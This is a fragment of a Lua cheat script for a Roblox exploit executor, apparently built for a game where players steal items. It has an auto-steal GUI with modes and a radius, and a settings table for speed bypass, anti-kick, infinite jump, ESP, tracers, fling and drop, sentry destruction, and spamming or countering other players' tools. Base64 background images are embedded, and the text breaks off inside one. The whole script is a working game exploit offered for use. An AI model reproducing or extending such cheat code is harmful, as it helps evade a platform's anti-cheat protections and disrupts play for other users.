 if not ok then warn("[AutoSteal] Sync error:", err) end
 else
 warn("[AutoSteal] AceAutoStealSync missing")
 end
 -- force start if still not
 if autoStealEnabled then
 local mode = selectedStealMode
 if mode == "Normal" or mode == "V1" then
 if _G.AceNormalAutoStealStart then pcall(_G.AceNormalAutoStealStart) end
 elseif mode == "Semi" or mode == "V2" or mode == "V3" then
 -- V3 UI = Semi Version2
 if mode == "V3" then
 selectedStealMode = "Semi"
 autoStealV2Version = "V2"
 end
 if _G.AceSemiAutoStealStart then pcall(_G.AceSemiAutoStealStart) end
 end
 end
 refreshUI()
 saveVAS()
 print("[AutoSteal] ON=", autoStealEnabled, "mode=", selectedStealMode, "radius=", autoStealRadius)
	end

	onBtn.MouseButton1Click:Connect(function() setStealOn(not autoStealEnabled) end)
	for name,b in pairs(modeBtns) do
 b.MouseButton1Click:Connect(function() applyMode(name); refreshUI() end)
	end
	expBtn.MouseButton1Click:Connect(function()
 saved.expanded = not saved.expanded
 expandPanel.Visible = saved.expanded
 main.Size = UDim2.fromOffset(BASE_W, saved.expanded and BASE_H_EXP or BASE_H)
 expBtn.Text = saved.expanded and "−" or "+"
 saveVAS()
	end)
	lockBtn.MouseButton1Click:Connect(function()
 saved.locked = not saved.locked
 lockBtn.Text = saved.locked and "🔒" or "🔓"
 saveVAS()
	end)
	radBox.FocusLost:Connect(function() setRadius(radBox.Text) end)
	radMinus.MouseButton1Click:Connect(function() setRadius((tonumber(autoStealRadius) or 60) - 1) end)
	radPlus.MouseButton1Click:Connect(function() setRadius((tonumber(autoStealRadius) or 60) + 1) end)
	bgPrev.MouseButton1Click:Connect(function() applyBg(saved.bgIndex - 1) end)
	bgNext.MouseButton1Click:Connect(function() applyBg(saved.bgIndex + 1) end)
	scaleMinus.MouseButton1Click:Connect(function()
 saved.scale = math.clamp((saved.scale or 1) - 0.1, 0.5, 2.5)
 uiScale.Scale = saved.scale
 scaleVal.Text = string.format("%.0f%%", saved.scale * 100)
 saveVAS()
	end)
	scalePlus.MouseButton1Click:Connect(function()
 saved.scale = math.clamp((saved.scale or 1) + 0.1, 0.5, 2.5)
 uiScale.Scale = saved.scale
 scaleVal.Text = string.format("%.0f%%", saved.scale * 100)
 saveVAS()
	end)

	RunService.RenderStepped:Connect(function()
 local p = math.clamp(tonumber(_G.AceStealBarProgress) or 0, 0, 1)
 barFill.Size = UDim2.new(p, 0, 1, 0)
 radiusLbl.Text = "Radius: " .. tostring(math.floor(tonumber(autoStealRadius) or 60))
 local pct = math.floor(p * 100 + 0.5)
 if p > 0.005 then
 statusLbl.Text = string.format("%d%%", pct)
 statusLbl.TextSize = 22
 statusLbl.Font = Enum.Font.GothamBlack
 if pct >= 100 then
 statusLbl.TextColor3 = Color3.fromRGB(120, 255, 160)
 elseif pct >= 75 then
 statusLbl.TextColor3 = Color3.fromRGB(255, 230, 100)
 else
 statusLbl.TextColor3 = Color3.fromRGB(255, 255, 255)
 end
 statusLbl.TextStrokeTransparency = 0.15
 else
 statusLbl.Text = autoStealEnabled and "READY" or "IDLE"
 statusLbl.TextSize = 16
 statusLbl.Font = Enum.Font.GothamBold
 statusLbl.TextColor3 = autoStealEnabled and Color3.fromRGB(140, 255, 180) or COL.dim
 statusLbl.TextStrokeTransparency = 0.35
 end
	end)

	do
 local dragging, start, startPos = false, nil, nil
 local function begin(input)
 if saved.locked then return end
 if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
 dragging = true; start = input.Position; startPos = main.Position
 end
 end
 header.InputBegan:Connect(begin)
 main.InputBegan:Connect(begin)
 UserInputService.InputChanged:Connect(function(input)
 if not dragging or saved.locked then return end
 if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
 local d = input.Position - start
 main.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + d.X, startPos.Y.Scale, startPos.Y.Offset + d.Y)
 end
 end)
 UserInputService.InputEnded:Connect(function(input)
 if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
 if dragging then dragging = false; saveVAS() end
 end
 end)
	end

	-- Restore mode + ON/OFF đã lưu
	pcall(function()
 if saved.mode == "V2" then
 selectedStealMode = "Semi"
 autoStealV2Version = "V1"
 elseif saved.mode == "V3" then
 selectedStealMode = "Semi"
 autoStealV2Version = "V2"
 else
 selectedStealMode = "Normal"
 end
 setRadius(autoStealRadius)
	end)
	refreshUI()
	applyBg(saved.bgIndex)
	if saved.enabled then
 task.defer(function()
 pcall(function() setStealOn(true) end)
 end)
	end
	print("[AutoSteal] GUI ready — mode=", saved.mode, "enabled=", saved.enabled, "scale=", saved.scale)
end)
]==])
	end
end)

local St = {
	antiGummy = true, antiRagdoll = false, antiPaint = true, antiBoogie = true, antiBee = false,
	toolAim = true, speedOn = true, infJump = true, bodyLock = false, bodyLockRange = 20,
	activeMode = "Normal",
	modes = {
 Normal = { norm = 59, steal = 30, key = Enum.KeyCode.T },
 Lagger = { norm = 18, steal = 24, key = Enum.KeyCode.Q },
 Custom = { norm = 33, steal = 33, key = Enum.KeyCode.C },
	},
	dropMode = 2, -- 1 Stand/Fling, 2 Jump
	instaMode = "V1",
	mobileBtns = true, guiLock = false, -- default ON: Drop / Insta / TP buttons
	showBtnPiam = true, showBtnSentry = true, showBtnAgu = true, showBtnMedu = true,
	showStealBtn = true, showLaggerPanel = false, showPingLaggerPanel = false, showSpeedBypassPanel = false, speedBypassLock = false, panelGuiScale = 0.7, panelGuiWidth = 1, laggerPanelLock = false, pingPanelLock = false, -- hiện nút Auto Steal ngoài (độc lập auto steal on/off)
	btnShape = "Square", -- Round | Box | Square
	btnScale = 0.75,
	menuScale = 1.0,
	btnSizes = { mode = 50, drop = 50, insta = 50, tp = 50, sentry = 50, steal = 50, antitrap = 50 },
	keys = {
 Drop = Enum.KeyCode.X,
 TPDown = Enum.KeyCode.F,
 InstaReset = Enum.KeyCode.Z,
 DestroySentry = Enum.KeyCode.H,
 AutoSteal = nil, -- nil = None (no key)
	},
	esp = false, tracer = false, antiLag = false, trapEsp = false,
	bgIndex = 1, -- 1 Heaven 2 Knight 3 Samurai 4 Snow
	antiKick = true, wallOpacity = 0.12, speedMethod = "Velocity",
	destroySentry = false,
	spamLaser = false, spamPaint = false,
	counterLaser = false, counterBoogie = false, counterSwapBody = false,
	equipOnDrop = false,
}
local ToggleRefs = {} -- để Reset All cập nhật UI

----------------------------------------------------------------
-- MENU BACKGROUND (4 custom images via getcustomasset)
----------------------------------------------------------------
local BG_FILES = {
	{ name = "Heaven", file = "IlusionBG_Heaven.jpg" },
	{ name = "Knight", file = "IlusionBG_Knight.jpg" },
	{ name = "Samurai", file = "IlusionBG_Samurai.jpg" },
	{ name = "Snow", file = "IlusionBG_Snow.jpg" },
}
local BG_ASSETS = {} -- [index] = custom asset string
local MenuBgImage = nil -- set after Main GUI

local function b64decode(data)
	local b = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
	data = string.gsub(data, '[^'..b..'=]', '')
	return (data:gsub('.', function(x)
		if x == '=' then return '' end
		local r, f = '', (b:find(x) - 1)
		for i = 6, 1, -1 do r = r .. (f % 2^i - f % 2^(i-1) > 0 and '1' or '0') end
		return r
	end):gsub('%d%d%d?%d?%d?%d?%d?%d?', function(x)
		if #x ~= 8 then return '' end
		local c = 0
		for i = 1, 8 do c = c + (x:sub(i, i) == '1' and 2^(8 - i) or 0) end
		return string.char(c)
	end))
end

-- Binary payloads injected below as Ilusion_BG_DATA

Ilusion_BG_DATA = {
  ["IlusionBG_Heaven.jpg"] = [[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